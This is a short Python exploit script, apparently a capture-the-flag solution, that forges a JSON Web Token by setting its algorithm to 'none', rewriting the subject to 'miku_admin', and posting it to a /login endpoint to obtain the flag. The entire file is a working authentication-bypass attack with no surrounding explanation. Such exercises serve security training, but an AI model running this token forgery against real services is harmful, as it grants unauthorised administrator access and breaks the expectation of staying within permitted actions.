from ten import *
from tenlib.transform import *
from dataclasses import *
import json
import base64
import blog
 

def tweak_token(token: str) -> str:
    header, payload, signature = token.split(".")
    base64_decoded_header = json.loads(base64.b64decode(header + '=' * (-len(header) % 4)).decode())
    base64_decoded_payload = json.loads(base64.b64decode(payload + '=' * (-len(payload) % 4)).decode())
    
    # Changing alg to none
    base64_decoded_header["alg"] = "none"
    base64_decoded_payload["sub"] = "miku_admin"
    
    header = base64.b64encode(json.dumps(base64_decoded_header).encode()).decode().replace("=", "")
    payload = base64.b64encode(json.dumps(base64_decoded_payload).encode()).decode().replace("=", "")
    
    cookie = f"{header}.{payload}.{signature}"
    blog.log(f"Tweaked Cookie is : {cookie}")
    return cookie

def solve(host, token):
    session = ScopedSession(host)
    
    # Retrieving the token
    blog.log("Retrieving the token....")
    cookie = tweak_token(token)
    data = {"magic_token": cookie}
    flag = session.post("/login", data=data)
    blog.log(flag.text)

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 3:
        print("Usage: ./exploit.py <host> <token>")
        sys.exit(1)
    
    host = sys.argv[1]
    token = sys.argv[2]
    solve(host, token)